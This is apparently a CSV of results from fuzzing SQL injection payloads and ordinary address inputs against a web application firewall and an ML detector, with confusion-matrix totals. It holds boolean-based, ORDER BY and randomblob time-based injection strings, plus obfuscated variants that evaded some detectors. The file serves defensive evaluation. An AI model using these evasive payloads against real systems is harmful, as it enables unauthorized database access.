@@ -1,0 +1,62 @@
+Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
+1,2024-08-27T10:26:18.035434,"nucleo santiago apostol 34, 4?f",200,200,200,both_correct,"nucleo santiago apostol/*E*/(SELECT  AND	'01r
+' LIKE '01r
+'), 4?f",2024-08-27T10:26:19.905168,200,403,waf_correct_ml_incorrect,"nucleo santiago apostol/*E*/(seleCt/*Z~|C*/ aND '01r
+' LiKE '01r
+'), 0x4?f",2024-08-27T10:26:23.585251,200,200,both_correct,"nucleo santiago apostol (SeLECT/*Z~|C*/ ANd
+'01r
+' Like '01r
+'), 0x4?f",2024-08-27T10:26:27.648234,200,200,both_correct,"nucleo santiago apostol (selEcT/*Z~|C*/ ANd
+'01r
+'
+LikE '01r
+'),/**/0x4?f",2024-08-27T10:26:31.561631,200,200,both_correct,"nucleo santiago apostol (seLeCT/*Z~|C*/ ANd
+'01r
+'	LIKE '01r
+'), 0x4?f",2024-08-27T10:26:35.580621,200,200,both_correct
+2,2024-08-27T10:26:39.486624,"pintanos, los",200,200,200,both_correct,"pintanos,/**/los",2024-08-27T10:26:40.113858,200,200,both_correct,"pintanos,/*oij5*/los",2024-08-27T10:26:41.994798,200,200,both_correct,"pintanos,/*#*/los",2024-08-27T10:26:44.051987,200,200,both_correct,"pintanos, los",2024-08-27T10:26:45.897311,200,200,both_correct,"pintanos,
+los",2024-08-27T10:26:47.515052,200,200,both_correct
+3,2024-08-27T10:26:49.138790,"c/ja del indiano, s/n,",200,200,403,waf_correct_ml_incorrect,"c/ja/**/del	indiano, s/n,",2024-08-27T10:26:50.206134,200,200,both_correct,"c/ja/**/del
+indiano,/**/s/n,",2024-08-27T10:26:52.312402,200,200,both_correct,"c/ja del	indiano,/**/s/n,",2024-08-27T10:26:54.532763,200,200,both_correct,"c/ja del	indiano,	s/n,",2024-08-27T10:26:56.628001,200,200,both_correct,"c/ja/**/del
+indiano,	s/n,",2024-08-27T10:26:58.665381,200,200,both_correct
+4,2024-08-27T10:27:00.802788,"calle capitan godoy beltran, 120",200,200,200,both_correct,"calle/**/capitan godoy beltran, (sElecT
+(SelEcT 1))",2024-08-27T10:27:02.187795,403,200,waf_incorrect_ml_correct,"calle capitan godoy beltran, (SEleCT (selecT (SElEct 1) lIKe (seLecT 9674)))",2024-08-27T10:27:05.324219,403,200,waf_incorrect_ml_correct,"calle capitan godoy/**/beltran, (sELEcT (SelecT (SelECT '5a%S' lIKE '5a%S')
+like (sElect 0x25ca)))",2024-08-27T10:27:09.667769,403,200,waf_incorrect_ml_correct,"calle capitan godoy/**/beltran, (SELECt (sELecT (SELeCt '5a%S' LiKe '5a%S') LiKe/**/(SeleCt 0x25ca)))",2024-08-27T10:27:15.830056,200,403,waf_correct_ml_incorrect,"calle capitan/**/godoy/*i*/beltran, (sElecT (sElecT (selecT '5a%S'	LikE '5a%S') Like/**/(SelEct 0x25ca)))",2024-08-27T10:27:21.073850,200,200,both_correct
+5,2024-08-27T10:27:26.358513,1' and 5967=4184#,403,403,403,both_correct,1'/**/aND 5967 Like	(SELECT 7719)!=7720#*(SELECT 1),2024-08-27T10:27:27.188229,403,403,both_correct," AND 1'/*^\$T*/aND/**/(SELECT 5967) Like
+(SELECT 7719)!='f'<>'fW'#*(sELeCt 1)",2024-08-27T10:27:30.330166,403,403,both_correct," && 'R'='R''/**/aND (SELECT
+(SELECT (SELECT 1))) Like
+(SELECT 7719)!='f'<>'fW'#*(sElEcT 1)6",2024-08-27T10:27:34.455598,403,403,both_correct," &&/**/'R' LIkE 'R''/**/aND (SELECT
+(SELECT (SELECT 0x1))) Like
+(SELECT	7719)!='f'<>'fW'#*(sELect  Or 'H#'='H#')6_",2024-08-27T10:27:39.291902,403,403,both_correct," &&/**/'R' liKe 'R'' aND (SELECT
+(SELECT (SELECT 0x1))) Like	(SELECT	 AND (SELECT 4313!=4314))!='f'<>'fW'#*(sELect  Or 'H#'='H#')6_",2024-08-27T10:27:45.321288,403,403,both_correct
+6,2024-08-27T10:27:52.326243,paris-loisel@viavilano.cr,200,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T10:27:53.442960,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T10:27:55.694798,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T10:27:57.817243,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T10:28:00.045741,200,200,both_correct,paris-loisel@viavilano.cr,2024-08-27T10:28:02.471964,200,200,both_correct
+7,2024-08-27T10:28:04.557545,-2530%' order by 1#,403,403,403,both_correct,"- && (seLEcT
+7433)<>7434%'/*I~)6*/order by 1#",2024-08-27T10:28:05.419705,403,200,waf_correct_ml_incorrect,- && (selECt	 OR 0)<>0x1d0a%'/*I~)6*/order by/**/9882 not like 9883#,2024-08-27T10:28:08.517589,403,200,waf_correct_ml_incorrect,- && (seleCT/**/ Or (SELECT 1))!=0x1d0a%'/*I~)6*/order by/**/'L'='L' not like (SELECT 9883)#%p,2024-08-27T10:28:13.039676,403,403,both_correct,-  anD  (SeLecT/**/	OR (sElECT/**/(SeLECt 1)))!=0x1d0a%'/*I~)(SELECT 'gp'='gp')*/order by/*Dc*/'L'='L' not like (sElECt 9883)#%p,2024-08-27T10:28:18.279062,403,200,waf_correct_ml_incorrect,"-  AnD  (SELECT/**/
+oR (sELeCt/**/(SEleCt 1))) not like 0x1d0a%'/*I~)(SELECT 'gp'='gp')*/order by/*tG=IN*/'L'='L' not like (SElEct (selecT  AND/**/'O' NOT LIKE 'O;'))#%p",2024-08-27T10:28:25.061822,403,403,both_correct
+8,2024-08-27T10:28:33.996068,"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",403,403,403,both_correct,"1%')))/**/and	8148=like('abcdefg',upper(hex(randomblob( oR (SelECt 4925) NOT LIKE 4926/2))))--",2024-08-27T10:28:37.353695,403,403,both_correct,"1%')))/**/and	8148=like('abcdefg',upper(hex(randomblob( oR	(SelECt 'L' A'!='L' Aj') NOT LIKE/**/(SeLecT (sElEcT 1))/2))))--",2024-08-27T10:28:42.926720,403,200,waf_correct_ml_incorrect,"0x1%')))/**/and	452/**/NOT LIKE (SELECT 1)=like('abcdefg',upper(hex(randomblob( oR	(SelECt 'L' A'
+not like 'L' Aj') NOT LIKE/**/(SeLEct (seLECt 1))/2))))--",2024-08-27T10:28:48.860412,403,403,both_correct,"0x1%')))/*Xt7E*/and	452/**/NOT LIKE (SELECT  AND 1)=like('abcdefg',upper(hex(randomblob( oR
+(SelECt 'L' A'
+not like 'L' Aj') not like (sEleCt (selECT (SeLecT 7217)<>7218))/2))))--",2024-08-27T10:28:56.151791,403,403,both_correct,"0x1%')))/*Xt7E*/and	452/**/NOT LIKE (SELECT  AND  AND 1)=like('abcdefg',upper(hex(randomblob( oR
+(SelECt 'L'/*Q""9*/A'
+not like 'L'	Aj') not like (sEleCt (selECT (SeLecT ';'<>';?')!=7218))/0x2))))--",2024-08-27T10:29:05.025364,403,403,both_correct
+9,2024-08-27T10:29:15.306316,-4803%')) or 8571=8571-,403,403,403,both_correct,-6754!=6755%')) oR/*l*/ AND (SELECT 1) like	8571-,2024-08-27T10:29:16.317055,200,403,waf_incorrect_ml_correct,"-6754<>0x1a63%')) oR/**//**/AND (SELECT  AND 1) like 'V,~gi'='V,~gi'-",2024-08-27T10:29:19.657274,200,403,waf_incorrect_ml_correct,"-927 IN (926,927,928)/**/not like 0x1a63%'))	oR/**//**/AND (SELECT  AND  AND (SELECT 1)) like 'V,~gi'='V,~gi'-",2024-08-27T10:29:23.755762,200,403,waf_incorrect_ml_correct,"-927 iN (9123 not like 9124,(SeleCt 1),928) not like 0x1a63%'))	oR/**//**/AND (SELECT 
+AND  AND (SELECT 0x1)) like 'V,~gi'='V,~gi'-",2024-08-27T10:29:30.237688,403,403,both_correct,"-927 IN (9123	not like 3735 not like  oR 0,(SElect 1),0x3a0) not like 0x1a63%'))	oR/**//**/AND (SELECT 
+AND /**/AND (SELECT 0x1)) like 'V,~gi'='V,~gi'-",2024-08-27T10:29:37.162638,403,403,both_correct
+10,2024-08-27T10:29:45.032276,"1"""" order by 1#",403,200,403,waf_incorrect_ml_correct,"0x1"""" order
+by/**/ OR 0<>4873#*",2024-08-27T10:29:45.730366,200,200,both_incorrect,"0x1"""" order	by/**/ oR/**/(SElEcT 0x1)<>'^J'<>'^J4'#*mR",2024-08-27T10:29:48.152877,200,200,both_incorrect,"0x1"""" order by  OR/*EMhM*/(SELEcT 0x1)<>'^J' NOT LIKE '^J4'#*mR",2024-08-27T10:29:51.510824,200,403,waf_incorrect_ml_correct,"0x1"""" order by  or (sElect 0x1)<>'^J' not like	'^J4'#*mR}",2024-08-27T10:29:55.583793,200,403,waf_incorrect_ml_correct,"0x1""""/**/order by  || (SeLECt 0x1)<>'^J' not like
+'^J4'#*mR}ui",2024-08-27T10:29:59.215127,403,200,waf_correct_ml_incorrect
+
+Overall Results
+WAF TP,22
+WAF TN,27
+WAF FP,3
+WAF FN,8
+ML TP,23
+ML TN,27
+ML FP,3
+ML FN,7
+
+Combined Results (2x2 Matrix)
+,WAF Correct,WAF Incorrect
+ML Correct,41,9
+ML Incorrect,8,2
